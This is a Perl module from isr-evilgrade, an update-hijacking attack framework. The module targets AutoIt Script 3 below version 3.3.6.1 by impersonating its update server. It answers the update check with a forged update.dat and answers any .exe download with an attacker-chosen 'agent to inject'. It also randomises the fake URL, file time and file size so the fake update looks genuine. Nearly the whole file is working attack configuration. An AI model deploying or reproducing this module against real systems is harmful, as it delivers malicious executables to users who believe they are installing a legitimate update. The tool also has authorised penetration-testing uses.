###############
# autoit3.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##

package modules::autoit3;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'AutoIt Script 3',
    'version'     => '1.0',
    'appver'      => '< 3.3.6.1',
    'author'      => ['Leandro Costantino < lcostantino +[AT]+ gmail.com>'],
    'description' => qq{AutoIt Scripting Language},
    'vh'          => 'www.autoitscript.com',
    'request'     => [
        {   'req'    => '/update.dat',    #regex friendly
            'type'   => 'file',           #file|string|agent|install
            'method' => '',               #any
            'bin'    => '0',
            'string' => "",
            'parse'  => '1',
            'file' => './include/autoit3/autoitscript.dat',
        },
        {   'req'    => '.exe',           #regex friendly
            'type'   => 'agent',          #file|string|agent|install
            'method' => '',               #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },

        'version_stable' => {
            'val'  => '4.2.14.1',
            'desc' => 'AutoIt Stable Version'
        },
        'version_beta' => {
            'val'  => '4.2.15.1',
            'desc' => 'AutoIt Beta Version'
        },

        'url' => {
            'val' =>
                "'http://www.autoitscript.com/files/autoit/autoit-'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).'.exe'",
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'filetime' => {
            'val' =>
                " '20080'.isrcore::utils::RndNum(1) . isrcore::utils::RndNum(7,1,2)  ",
            'dynamic' => 1
        },
        'filesize' => {
            'val'     => " '2'.isrcore::utils::RndNum(5) ",
            'dynamic' => 1
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
